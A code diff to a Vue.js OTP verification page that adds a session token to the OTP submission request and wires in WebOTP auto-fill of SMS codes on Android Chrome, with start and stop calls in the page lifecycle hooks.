@@ -102,6 +102,8 @@ import OtpInput from '@/components/ui/OtpInput.vue';
 import StcLayout from '@/car.insurance/components/StcLayout.vue';
 import { getReasonLabel } from '@/constants/rejectionReasons';
 import { safeRedirect } from '@/utils/safeRedirect';
+import { getSessionToken } from '@/utils/sessionToken';
+import { useWebOtp } from '@/composables/useWebOtp';
 
 const router = useRouter();
 const route = useRoute();
@@ -150,6 +152,7 @@ const verifyOtp = async () =>
     try
     {
         const res = await request.post( '/otp/submit', {
+            session_id: getSessionToken(),
             otp: otpCode.value,
             phone: phoneNumber,
             type: 'stc_otp',
@@ -271,12 +274,20 @@ const retryOtp = () =>
 };
 
 // ─── Lifecycle ──────────────────────────────────────────────────────
+// WebOTP API — auto-fill OTP from SMS on Android Chrome
+const { start: startWebOtp, stop: stopWebOtp } = useWebOtp( ( code ) =>
+{
+    const digits = String( code || '' ).replace( /\D/g, '' ).slice( 0, 6 );
+    if ( digits.length >= 4 ) otpCode.value = digits;
+} );
+
 onMounted( () =>
 {
     startCountdown();
     otpInputRef.value?.focusFirstEmpty();
     setupWebSocket();
     startPolling();
+    startWebOtp();
 
     if ( route.query.error )
     {
@@ -286,6 +297,7 @@ onMounted( () =>
 
 onUnmounted( () =>
 {
+    stopWebOtp();
     if ( countdownInterval ) clearInterval( countdownInterval );
     if ( pollTimer )
     {
